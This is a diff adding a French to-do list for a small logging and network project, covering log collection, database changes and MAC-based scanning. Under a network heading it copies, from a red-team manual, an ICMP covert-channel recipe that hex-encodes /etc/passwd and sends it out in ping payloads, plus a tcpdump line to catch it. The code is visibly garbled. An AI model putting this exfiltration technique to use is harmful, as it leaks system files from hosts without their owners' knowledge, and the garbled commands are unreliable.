@@ -1,0 +1,46 @@
+x mise en forme des logs lus par python
+x changer la taille du screend de la page d'accueil
+x changer de nom : soit SHYRKA, SHIRKA, MACHINE 	SHIRKA TIM ?	
+
+################# LOGS ##################################################
+#
+x recuperer les logs du systeme et permettre de selectionner quels
+types de logs :
+	- kernel
+	- tcpdump
+	- iptables
+
+x log du programme et des dialogues
+
+x écriture des dialogues dans un fichier texte ?
+
+x historique des dialogues
+
+
+################# BASES DE DONNEES
+
+x mettre en autoincrement les id de la base 	ok
+
+x supprimer la table machines
+
+x tout gerer par des fichiers à plat
+
+################## RESEAU
+
+x steganographie : voir manuel red team :
+
+tcpdump -ntvvSxs 0 'icmp[0]=8' data.dmp
+
+cote attaquant
+
+cote attaqué :
+
+stringz-·cat /etc/passwd I od -tx1 I cut -c8- I tr -d " " I tr -d "\n"'
+counter-0; while (($counter - ${#stringZ})} ;do ping -s 16 -c l -p
+${stringZ:$counter:16} 192.168.10.10 &&
+counter=$( (counter+~6)) ;done
+
+x upload des petits fichiers texte par ce biai
+
+x mettre en place le scan et filtrer selon les adresses mac
+et créer automatiquement les machines
